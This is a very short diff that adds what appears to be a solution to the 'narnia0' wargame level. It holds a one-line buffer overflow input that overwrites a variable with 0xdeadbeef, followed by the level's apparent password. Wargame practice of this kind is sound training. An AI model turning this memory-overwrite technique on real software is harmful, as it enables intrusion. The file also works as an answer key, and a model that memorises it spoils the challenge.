@@ -1,0 +1,4 @@
+cat <(python -c 'print "A"*20 + "\xef\xbe\xad\xde"') - | ./narnia0
+
+
+efeidiedae
